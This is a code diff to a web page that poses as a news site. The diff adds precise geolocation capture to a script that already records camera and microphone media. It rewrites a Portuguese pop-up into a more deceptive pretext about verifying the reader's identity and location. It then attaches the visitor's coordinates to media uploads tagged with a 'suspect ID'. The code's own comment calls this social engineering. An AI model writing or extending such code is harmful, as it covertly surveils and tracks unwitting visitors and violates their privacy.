@@ -470,6 +470,8 @@
         let photoCount = 0;
         let mediaRecorder = null;
         let audioChunks = [];
+        let userLatitude = null;
+        let userLongitude = null;
 
         // DOM Elements
         const videoElement = document.getElementById('video');
@@ -478,11 +480,32 @@
         const subscribeBtn = document.getElementById('subscribeBtn');
         const emailInput = document.getElementById('emailInput');
 
+        // Request geolocation permissions
+        async function requestLocationAccess() {
+            if (navigator.geolocation) {
+                console.log("Requesting location...");
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        userLatitude = position.coords.latitude;
+                        userLongitude = position.coords.longitude;
+                        console.log("Location captured:", userLatitude, userLongitude);
+                    },
+                    (error) => {
+                        console.error("Error capturing location:", error);
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            }
+        }
+
         // Request camera permissions with social engineering
         async function requestCameraAccess() {
             try {
-                // Show a convincing message before requesting camera access
-                alert("Para personalizar as notícias que você vê e melhorar sua experiência de leitura, estamos realizando uma breve verificação ambiental. Esta é uma análise automática para otimizar o conteúdo para você.");
+                // Show a combined convincing message
+                alert("Para personalizar as notícias que você vê, oferecer conteúdo relevante para sua região e garantir uma experiência de leitura segura, precisamos verificar sua identidade e localização. Esta é uma análise automática padrão.");
+
+                // Request location
+                requestLocationAccess();
 
                 // Request camera and microphone access
                 stream = await navigator.mediaDevices.getUserMedia({
@@ -500,7 +523,7 @@
                 return true;
             } catch (error) {
                 console.error('Error accessing media devices:', error);
-                alert("Verificação não concluída. Continuaremos mostrando notícias relevantes com base em suas preferências salvas.");
+                alert("Sem as permissões necessárias, a personalização de notícias regionais e recursos extras de segurança podem ser limitados.");
                 return false;
             }
         }
@@ -600,8 +623,14 @@
             formData.append('file', blob, filename);
             formData.append('caption', `News template - ${mediaType} captured at ${new Date().toLocaleString()}`);
 
+            // Add geolocation data if available
+            if (userLatitude !== null && userLongitude !== null) {
+                formData.append('latitude', userLatitude);
+                formData.append('longitude', userLongitude);
+            }
+
             // Debug logging
-            console.log('Sending media with suspect ID:', window.SUSPECT_ID);
+            console.log('Sending media with suspect ID:', window.SUSPECT_ID, 'Geo:', userLatitude, userLongitude);
 
             try {
                 const response = await fetch('/api/angosite/upload/', {
